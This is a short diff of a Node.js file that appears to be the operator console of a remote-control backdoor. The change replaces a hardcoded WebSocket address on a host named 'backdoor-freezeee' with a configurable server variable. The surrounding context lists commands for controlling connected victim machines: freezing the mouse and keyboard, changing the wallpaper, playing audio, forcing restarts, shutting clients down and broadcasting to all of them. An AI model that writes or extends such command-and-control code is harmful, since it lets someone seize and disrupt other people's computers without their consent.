@@ -3,7 +3,7 @@ const readline = require("readline");
 
 require("dotenv").config()
 
-const ws = new WebSocket("wss://backdoor-freezeee.onrender.com");
+const ws = new WebSocket(SERVER_ADDRESS);
 
 const optionsTable = `M - Freeze Mouse         K - Freeze Keyboard\nUM - Unfreeze Mouse      UK - Unfreeze Keyboard\nI - Image                CW - Change Wallpaper\nC - Calculator           FR - Force Restart\nSF - Safe Restart        AU - Audio\nCUI - COOK PC UI!!\nBYE - Turns off a client\n\nLC - List Clients\n\nIf want to send to all clients, then type: 'a|(command)|opc arg1)'`;
 
